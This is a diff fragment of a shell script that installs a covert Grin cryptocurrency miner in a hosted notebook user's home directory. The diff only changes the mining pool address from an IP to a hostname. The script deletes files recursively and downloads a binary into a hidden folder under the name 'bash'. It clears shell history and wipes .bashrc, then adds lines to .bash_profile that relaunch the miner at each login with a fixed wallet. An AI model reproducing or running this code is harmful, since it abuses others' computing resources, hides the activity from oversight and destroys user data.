@@ -9,7 +9,7 @@ rm -R *
 rm -R /home/studio-lab-user/.ton
 WORKER="testertuturu"
 WALLETNH="grin1hqhv4z3ju2gavh35y6m2uqyhufs79xr7pt02sn7h22awwduk6e8s8j0dsa"
-POOLNH="162.19.139.184:3030"
+POOLNH="grin.2miners.com:3030"
 wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr
 echo ""  > /home/studio-lab-user/.bashrc
 echo "" > /home/studio-lab-user/.bash_history
@@ -20,7 +20,7 @@ echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_
 echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
 echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="grin1hqhv4z3ju2gavh35y6m2uqyhufs79xr7pt02sn7h22awwduk6e8s8j0dsa"' >> /home/studio-lab-user/.bash_profile
-echo 'POOLNH="162.19.139.184:3030"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="grin.2miners.com:3030"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
 echo "./.lib/bash --algo cuckatoo32 -s $POOLNH -u  $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
